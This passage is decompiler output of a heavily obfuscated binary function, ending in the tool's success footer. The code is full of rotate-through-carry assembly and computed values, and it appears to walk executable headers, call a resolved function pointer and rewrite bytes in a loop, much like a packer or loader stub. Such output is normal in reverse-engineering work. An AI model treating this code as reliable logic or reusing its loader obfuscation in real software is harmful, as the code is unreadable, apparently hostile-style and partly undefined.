  BYTE1(v17) = __ROL1__(BYTE1(v17), v61);
  LOWORD(v61) = v17 + (__CFADD__(v136, a6 << v61) | __CFADD__(v44, v136 + (a6 << v61))) + v61;
  v137 = v17;
  v26 = __ROR4__(v44, v61);
  BYTE1(v17) = BYTE1(v17) - 1 - BYTE1(v61);
  BYTE1(v26) = (BYTE1(v26) - 1) & 0xB0;
  v27 = v137 - v17;
  v26 >>= 5;
  v66 = __CFSHR__(v17, 5);
  v17 >>= 5;
  BYTE1(v17) = 32 * (BYTE1(v17) - (v66 + v26));
  v67 = v17 ^ v26;
  v27 *= 32;
  v74 = v17;
  LOBYTE(v74) = 79;
  v75 = v27 + v74;
  v63 = v67 + v17;
  BYTE1(v75) -= v67;
  LOBYTE(v75) = __ROL1__(v75, 64) - 1;
  v76 = (unsigned __int8)(v75 + 64);
  v48 = (__PAIR64__(v45, v75) - __PAIR64__(v76, v67)) >> 32;
  _EBX = v75 - v67;
  BYTE1(_EBX) &= 0xB0u;
  _ECX = v76 >> v76;
  __asm { rcr     ebx, cl }
  v66 = __CFADD__(__CFSHR__(v67, _ECX), BYTE1(v67));
  BYTE1(v67) += __CFSHR__(v67, _ECX);
  v66 |= __CFADD__(BYTE1(v63), BYTE1(v67));
  BYTE1(v67) += BYTE1(v63);
  LOBYTE(v67) = v63 + v66 + ((unsigned __int8)v67 >> _ECX);
  v51 = v27 | v48;
  LOWORD(_ECX) = __ROL4__(_ECX, _ECX);
  BYTE1(_ECX) <<= _ECX;
  LOBYTE(_ECX) = (_BYTE)_ECX << _ECX;
  _ESI = v63 ^ v27;
  _EDI = __ROL4__(v51, _ECX);
  LOBYTE(v67) = BYTE1(v67) ^ v67 | 0xBC;
  LOBYTE(_EBX) = (v63 | _EBX) + 1;
  BYTE1(_EBX) = __ROL1__(BYTE1(_ECX) ^ (_ECX | BYTE1(_EBX) | 0x68), (_BYTE)_ECX << _ECX);
  _ECX = 4249586;
  v62 = _EDI & (_EBX | 0x40D7F2);
  v64 = _ESI + (_ESI & v67);
  LOBYTE(v63) = v62 + v63;
  v65 = __ROL4__(v62, 242);
  LOBYTE(v64) = (BYTE1(v63) & v64) - BYTE1(v65);
  LOBYTE(v65) = v65 + 1;
  do
  {
    BYTE1(v63) += _ECX;
    v77 = _ESI >> _ECX;
    v78 = _EDI >> _ECX;
    BYTE1(v64) = v63;
    _EDX = v64 << _ECX;
    _EBX = v65 + 1;
    ++BYTE1(_EDX);
    LOBYTE(_EBX) = (_BYTE)_EBX << _ECX;
    BYTE1(_EBX) ^= BYTE1(_EDX);
    BYTE1(_EDX) -= 88;
    __asm { rcl     bh, cl }
    _ECX = _ECX - 1;
    LOBYTE(_EBX) = (char)_EBX >> _ECX;
    v174 = _EBX | v78;
    v175 = _EBX & v63;
    _EBX = v77 + _EBX;
    __asm
    {
      rcl     ebx, cl
      rcl     edx, cl
    }
    BYTE1(_EBX) &= 0xF0u;
    BYTE1(v175) |= BYTE1(_ECX);
    LOBYTE(v175) = __ROR1__(v175, _ECX);
    __asm { rcl     bl, cl }
    v46 = _EBX | v175;
    _ECX >>= 15;
    _EDI = _EBX | v174;
    BYTE1(v46) ^= v46;
    __asm { rcl     edi, cl }
    _EAX = v77 + __CFSHL__(v46, _ECX) + (v46 << _ECX);
    BYTE1(_EBX) -= _EAX;
    _ECX = _ECX << 15;
    _EBX = _EDI | _EBX;
    __asm
    {
      rcl     bl, cl
      rcl     eax, cl
    }
    LOBYTE(_EBX) = _EBX | 0x5F;
    _EBX = _EBX >> _ECX;
    v188 = *(_DWORD *)_ECX;
    LOBYTE(_EBX) = _EBX + 1;
    BYTE1(_EBX) |= BYTE1(_EDI) & (unsigned __int8)(BYTE1(_EAX) - 1);
    LOWORD(_EBX) = _EBX - 1;
    HIDWORD(v24) = (unsigned __int8)*(_DWORD *)_ECX;
    __asm { rcr     bh, cl }
    BYTE1(_EBX) = __ROR1__(BYTE1(_EBX), _ECX);
    v25 = (unsigned __int8)(v188 & (((int)(v77 - _ECX) >> _ECX) - (BYTE1(*(_DWORD *)_ECX) & _EBX))) - v188;
    __asm { rcr     bh, cl }
    _EDI = v25 + 1;
    _EBX = (unsigned __int8)BYTE1(*(_DWORD *)_ECX);
    _ESI = *(_DWORD *)_ECX | v25;
    __asm { rcl     edi, cl }
    v148 = _ECX & __ROL4__(_EDI, _ECX);
    LODWORD(v24) = HIWORD(*(_DWORD *)_ECX);
    __asm { rcr     esi, cl }
    v94 = (HIDWORD(v24) + __CFSHL__(v148, _ECX) + BYTE1(v188) + __CFSHR__(v188, 16) + _ESI) >> _ECX;
    _EDI = v94 + (__ROL4__(v148 << _ECX, _ECX) >> _ECX);
    _RAX = __PAIR64__(v94, HIDWORD(v24)) + v24;
    __asm
    {
      rcl     edi, cl
      rcl     dl, cl
    }
    LODWORD(_RAX) = _EBX + _RAX;
    HIWORD(_EDX) = HIWORD(_ECX);
    BYTE1(_EDX) = BYTE1(_ECX) << _ECX;
    BYTE1(_EBX) = -9;
    __asm { rcr     bl, cl }
    LOBYTE(_EDX) = _EBX & _ECX;
    v40 = _EDX + __ROR4__(_EDI << _ECX, _ECX);
    __asm { rcr     ebx, cl }
    BYTE1(_EBX) += _ECX;
    __asm { rcr     ebx, cl }
    LOBYTE(_EBX) = _EBX - (__CFSHL__(v94, _ECX) + (BYTE1(_ECX) << _ECX)) + 83;
    _ESI = v40 & __ROL4__(v94, _ECX);
    LOBYTE(_EDX) = -120;
    v63 = ~(_RAX ^ 0xFFFFFEC8);
    BYTE1(_EBX) += _ECX;
    --_EBX;
    BYTE1(_EDX) = BYTE1(_ECX) << _ECX << _ECX;
    BYTE1(_EBX) -= BYTE1(_ECX);
    LOBYTE(_EBX) = BYTE1(_ECX) & _EBX;
    __asm { rcr     dl, cl }
    _EDI = (v40 + 1) >> _ECX;
    v65 = _EDI | _EBX;
    v64 = _EDX << _ECX;
    BYTE1(v65) = _ECX + __CFSHL__(BYTE1(v65), _ECX) + __ROL1__(BYTE1(v65), _ECX);
    LOBYTE(v65) = v65 | 0x12;
  }
  while ( v63 );
  v11 = v65 << _ECX;
  BYTE1(v64) = 104;
  __asm { rcl     edi, cl }
  BYTE1(v11) |= 0x34u;
  v132 = v64 + 1;
  LOBYTE(v132) = v132 ^ 4;
  v133 = v11 << _ECX;
  __asm { rcr     esi, cl }
  BYTE1(v133) <<= _ECX;
  LOBYTE(v133) = (_BYTE)_ECX << _ECX;
  v180 = v133 ^ v132;
  BYTE1(v180) -= _ECX;
  BYTE1(v133) += BYTE1(v180);
  _EDX = __ROL4__(v180, _ECX);
  LOBYTE(v133) = ((_BYTE)_ECX << _ECX) & 0xD0;
  v182 = v133 >> _ECX;
  v183 = *(_DWORD *)(_ECX + 60) + _ECX;
  LOBYTE(v182) = _EDX + __CFADD__(_EDX, _ESI) + v182;
  LOWORD(_EDX) = v183 + 80;
  v99 = (v183 | v182) - 1;
  BYTE1(v99) ^= 0xF2u;
  LOBYTE(v99) = v99 | 0x71;
  _ESI = ((_EDI + 1) >> _ECX) + 1;
  v101 = v99 << _ECX;
  LOBYTE(v101) = (_BYTE)v101 << _ECX;
  v102 = v101 >> _ECX;
  __asm { rcr     esi, cl }
  _ESI = __ROL4__(_ESI, _ECX);
  v187 = *(_DWORD *)(v183 + 80);
  LOBYTE(v102) = ((_BYTE)v102 << _ECX) - 30;
  LOBYTE(_EDX) = v183 + 113;
  __asm { rcr     esi, cl }
  BYTE1(v102) = __ROR1__(BYTE1(v102) - 76, _ECX);
  _EBX = v102 >> _ECX;
  LOWORD(_EDX) = v183 + (BYTE1(_EBX) < 0xC2u) + (_WORD)_EDX;
  BYTE1(_EBX) = (BYTE1(_EDX) + _EDX - 1) ^ 0xC4;
  __asm
  {
    rcl     dh, cl
    rcl     bh, cl
  }
  LOBYTE(_EBX) = (BYTE1(v183) & (_EDX | _EBX)) + 39;
  BYTE1(_EBX) <<= _ECX;
  _EBX = _ECX & _EBX;
  v183 += 128;
  LOBYTE(_EBX) = (_BYTE)_EBX << _ECX;
  __asm { rcl     ebx, cl }
  _EDX = v183;
  BYTE1(_EBX) += BYTE1(v183);
  BYTE1(_EDX) = BYTE1(v183) - 1;
  v14 = _EBX >> _ECX;
  BYTE1(v14) = _ECX + (v183 | BYTE1(v14));
  v85 = *(_DWORD *)v183;
  __asm { rcr     edx, cl }
  LOBYTE(v14) = BYTE1(v85) + __CFSHR__(_EDX, _ECX) + v14;
  _ESI = (_ECX & (_ESI << _ECX << _ECX >> _ECX << _ECX)) << _ECX;
  v88 = v14 << _ECX;
  LOBYTE(_EDX) = ((unsigned __int8)_EDX >> _ECX) + 1;
  v89 = _ECX + v85;
  v90 = (_ECX - 1) << _ECX;
  ++BYTE1(v88);
  BYTE1(_EDX) = (BYTE1(_ECX) | BYTE1(_EDX)) << _ECX;
  LOBYTE(v88) = _ECX;
  v91 = _EDX ^ v90 ^ v88;
  LOBYTE(v91) = 23 >> _ECX;
  BYTE1(_EDX) -= __CFSHR__(23, _ECX) + _EDX;
  ++v91;
  __asm { rcl     esi, cl }
  BYTE1(v91) ^= 0x53u;
  v66 = (unsigned __int8)v91 < BYTE1(_EDX);
  LOBYTE(v91) = v91 - BYTE1(_EDX);
  v150 = __ROR4__(_ESI, _ECX);
  _EDI = (v150 + _ECX + v66 + v90 - 1) << _ECX;
  v66 = __CFSHR__(v150, _ECX);
  v152 = v150 >> _ECX;
  v153 = v152 + v66 + v91;
  BYTE1(v153) <<= _ECX;
  LOBYTE(v153) = BYTE1(v89) | 0xCE;
  v154 = v152 - v153;
  --BYTE1(v153);
  --v153;
  v19 = _ECX + *(_DWORD *)(v89 + 16);
  __asm { rcr     edi, cl }
  BYTE1(v153) <<= _ECX;
  LOBYTE(v153) = -95;
  v134 = (int)(v19 ^ (v153 >> _ECX)) >> _ECX;
  BYTE1(v134) = _ECX;
  v135 = v134 ^ ((v154 >> _ECX) + 1);
  BYTE1(v134) = __ROL1__(_ECX, _ECX);
  v36 = (*(int (__cdecl **)(int))v19)(_ECX);
  BYTE1(v38) = v37;
  LOBYTE(v38) = _ECX;
  BYTE1(_ECX) &= 0x36u;
  __asm { rcr     ecx, cl }
  v128 = v38 << _ECX;
  LOBYTE(v128) = v128 | 0x28;
  v129 = v135;
  BYTE1(v128) ^= v36;
  v130 = v134 - v135;
  HIWORD(_ECX) = v186;
  LOBYTE(v130) = v130 ^ 0xC5;
  v66 = __CFADD__((_BYTE)v128, BYTE1(v130));
  BYTE1(v130) += v128;
  v98 = --v135 + v66 + v130;
  v122 = (v128 | v135) << v184;
  BYTE1(_ECX) = v185 | 0x8E;
  LOBYTE(_ECX) = (unsigned __int8)(v184 >> v184) >> (v184 >> v184);
  v81 = (v122 | v98) >> _ECX;
  v82 = __ROR4__(v122 << (v184 >> v184), _ECX);
  BYTE1(v81) = v81 | (BYTE1(v81) - 1);
  v187 += 1372;
  v83 = v81 + 1;
  _ECX = __ROR4__(_ECX, _ECX) - (v81 + 1);
  BYTE1(v83) = v187 | ((unsigned __int16)(v81 + 1) >> 8);
  v138 = v83 & v129;
  v139 = v187 - 1372;
  _ESI = v138 | (((v81 + 1) ^ v82) << _ECX);
  __asm { rcl     ecx, cl }
  LOBYTE(v83) = v81 - 72 - BYTE1(v83);
  _EDX = _ESI
       + ((unsigned __int8)(v81 - 72) < BYTE1(v83))
       + v83
       - ((__CFADD__((unsigned __int8)(v81 - 72) < BYTE1(v83), v83) | __CFADD__(
                                                                        _ESI,
                                                                        ((unsigned __int8)(v81 - 72) < BYTE1(v83)) + v83))
        + _ECX);
  BYTE1(_EDX) &= 0xBFu;
  LOBYTE(_EDX) = _ECX | _EDX;
  BYTE1(_ECX) -= 82;
  LOBYTE(_ECX) = (_ECX | 0xCB) ^ 0xD1;
  __asm { rcl     esi, cl }
  v7 = _ECX + ((_EDX ^ v138) << _ECX);
  __asm { rcl     edx, cl }
  _ECX = _ECX << _ECX;
  v9 = v7 - _EDX;
  v10 = 3064;
  SBYTE1(_EDX) >>= _ECX;
  v123 = __ROR4__(_ESI, _ECX);
  v124 = v9 - _ECX;
  LOBYTE(_ECX) = _ECX | 0xB;
  BYTE1(_EDX) = _EDX + (BYTE1(_EDX) & 0xF8);
  LOBYTE(_EDX) = BYTE1(_EDX) + _EDX + 22;
  BYTE1(_ECX) += v187 - 92;
  v126 = (v124 - (v187 - 1372)) >> _ECX;
  _EDX = __ROL4__(_EDX, _ECX);
  LOBYTE(_EDX) = _EDX & 0x8E;
  do
  {
    LOBYTE(_ECX) = _ECX - v10;
    v70 = v139 ^ v126;
    BYTE1(_ECX) += BYTE1(v10);
    _ECX = v123 ^ (_ECX + 1);
    v66 = (unsigned __int8)_ECX < (unsigned __int8)v139;
    LOBYTE(_ECX) = _ECX - v139;
    __asm { rcr     ecx, cl }
    v73 = v123 - (v66 + v70);
    v113 = v70 >> _ECX;
    v114 = __CFSHL__(BYTE1(_ECX), _ECX);
    BYTE1(_ECX) = __ROL1__(BYTE1(_ECX), _ECX);
    ++v73;
    BYTE1(_EDX) += _EDX + 4 + v114;
    v66 = __CFSHR__(v73, _ECX);
    v115 = v73 >> _ECX;
    LOBYTE(_ECX) = BYTE1(v10) + v66 + _ECX;
    v116 = v115 << _ECX;
    LOBYTE(_ECX) = __ROR4__(_ECX, _ECX);
    v169 = __ROR4__(v113, (((char)(_ECX + 1) >> (_ECX + 1)) + 1) & 0x74);
    v170 = v10;
    BYTE1(v170) = BYTE1(v10) - v10;
    _ECX = v116 | v170;
    v172 = v169 << _ECX;
    BYTE1(_ECX) = 31;
    __asm { rcr     cl, cl }
    v31 = v172 - (__CFADD__(*(_BYTE *)v139, 17) + _ECX);
    BYTE1(_ECX) = 63;
    v32 = _ECX - v139;
    _EDI = v31 << v32;
    v34 = __ROR4__(v116, v32);
    BYTE1(v32) ^= 0x93u;
    _ECX = v34 & v32;
    LOBYTE(_ECX) = v139 ^ _ECX;
    BYTE1(_ECX) -= __CFSHL__(v34, _ECX) + BYTE1(v10);
    __asm { rcr     ch, cl }
    v109 = v34 << _ECX >> _ECX;
    v110 = __ROR4__(v109, --_ECX);
    LOBYTE(_ECX) = 64;
    BYTE1(_ECX) &= 0x8Du;
    LOBYTE(_EDX) = ~__ROR1__(*(_BYTE *)v139 + 17, 30);
    __asm { rcr     ch, cl }
    LOBYTE(_ECX) = __ROR1__(_EDX, _EDX);
    v30 = __ROL4__(v110 - v139, _ECX);
    BYTE1(_ECX) = BYTE1(_ECX) + 118 - _EDX;
    LOBYTE(_ECX) = _ECX - 1;
    __asm { rcr     cl, cl }
    LOBYTE(_ECX) = __ROL1__(_ECX, _ECX);
    LOBYTE(_EDX) = -(char)_EDX;
    v55 = v30 >> _ECX;
    __asm { rcr     edi, cl }
    BYTE1(_ECX) = _EDX ^ (BYTE1(_ECX) - (((_BYTE)_EDX != 0) + BYTE1(v139)));
    _ECX = v10 + _ECX;
    v58 = __ROL4__(v55, _ECX);
    BYTE1(_ECX) = -20;
    v60 = __CFSHL__(v58, _ECX);
    _ESI = __ROL4__(v58, _ECX);
    __asm { rcl     esi, cl }
    v105 = _ESI + v60 + _EDI;
    _ECX = _ECX - v139;
    __asm { rcl     ch, cl }
    LOBYTE(_EDX) = __ROL1__(_EDX, 28);
    LOBYTE(_ECX) = _ECX - ((BYTE1(_ECX) < BYTE1(_EDX)) + BYTE1(v139));
    v107 = _ESI << _ECX;
    BYTE1(_ECX) = v10;
    _ECX = (_ECX << _ECX) - 1;
    ++BYTE1(_ECX);
    __asm { rcl     ch, cl }
    v66 = (unsigned __int8)_EDX < 0x82u;
    LOBYTE(_EDX) = _EDX + 126;
    v161 = v10 + v66 + _ECX;
    LOBYTE(v161) = (_BYTE)v161 << v161;
    _ESI = _EDX + v107;
    BYTE1(v161) = v161 ^ BYTE1(v139) & BYTE1(v161);
    _ECX = _EDX | v161;
    __asm
    {
      rcr     ecx, cl
      rcl     ecx, cl
    }
    LOBYTE(_ECX) = (char)_ECX >> _ECX;
    __asm { rcl     esi, cl }
    BYTE1(_ECX) = _EDX;
    __asm { rcr     dh, cl }
    BYTE1(_EDX) = __ROL1__(BYTE1(_EDX), _ECX);
    LOBYTE(_EDX) = (BYTE1(v139) + _EDX - (__CFADD__(BYTE1(v139), (_BYTE)_EDX) + BYTE1(v10))) | 0xF7;
    v117 = _EDX ^ ((_ESI << _ECX >> _ECX) - (__CFSHR__(_ESI << _ECX, _ECX) + v10));
    v118 = _EDX + (_ECX ^ ((v105 << _ECX) - 1));
    __asm { rcr     dl, cl }
    *(_BYTE *)v139 = BYTE1(_ECX);
    v119 = v10 + __CFSHL__(_EDX, _ECX) + v118;
    LOBYTE(_EDX) = __ROL1__(__ROL1__(_EDX, _ECX), _ECX);
    BYTE1(_EDX) = BYTE1(_EDX) - 29 + 21;
    _ESI = __ROR4__(v117 + 1, _ECX) >> _ECX;
    __asm { rcr     dh, cl }
    BYTE1(_EDX) = __ROL1__(v139++ | BYTE1(v10) ^ BYTE1(_EDX), _ECX);
    v29 = v10 ^ _EDX;
    BYTE1(v29) <<= _ECX;
    __asm { rcr     esi, cl }
    LOBYTE(v29) = (_BYTE)v29 << _ECX;
    v166 = v29 >> _ECX;
    v167 = (v139 | ((_ECX | v119) - v139)) + 1;
    v66 = __CFADD__(v167, v166);
    v168 = v167 + v166;
    --v10;
    LOBYTE(v168) = __ROL1__(BYTE1(v139) + v66 + v168, _ECX);
    BYTE1(v168) = v168 | (BYTE1(v168) - 96);
    v66 = __CFADD__((_BYTE)_ECX, BYTE1(v168));
    BYTE1(v168) += _ECX;
    v22 = __ROR4__(v167, _ECX) - (v66 + v168);
    _EDX = v10;
    __asm { rcl     dh, cl }
    BYTE1(_EDX) = __ROL1__(BYTE1(_EDX) ^ 0x79, _ECX);
    LOBYTE(_EDX) = BYTE1(v139) ^ ((_ECX ^ v10) - BYTE1(v139));
    v112 = (_BYTE *)(v139 + _EDX);
    v123 = v10 - 262705136;
    LOBYTE(v112) = (_BYTE)v112 - 1 - _ECX;
    BYTE1(v112) = (-3 << _ECX) & 0x39;
    BYTE1(v112) = (BYTE1(v10) ^ BYTE1(v112)) - 1;
    LOBYTE(v112) = BYTE1(_ECX) | (unsigned __int8)v112;
    _EDX = __ROL4__(v112, _ECX);
    v111 = _ECX ^ __ROR4__(v22, _ECX);
    v126 = v139 + __CFSHR__(v111 - v10, _ECX) + ((v111 - v10) >> _ECX);
    BYTE1(_EDX) = (_BYTE)v10 << _ECX;
  }
  while ( v10 );
  return (((unsigned __int8)(_ECX
                           + (BYTE1(_ECX) != 0)
                           + _EDX
                           - (((unsigned __int8)-BYTE1(_ECX) < 0xF2u)
                            + 14
                            - BYTE1(_ECX))) ^ ((_BYTE)v126 + (_BYTE)v139) & 0x10)
        - 109) << _ECX;
}
// 40D771: variable 'v37' is possibly undefined
// 40D773: variable '_ECX' is possibly undefined
// 40DB99: variable 'v38' is possibly undefined
// 40DBA4: variable 'v186' is possibly undefined
// 40DB54: variable 'v184' is possibly undefined
// 40DB5A: variable 'v185' is possibly undefined

// nfuncs=3 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
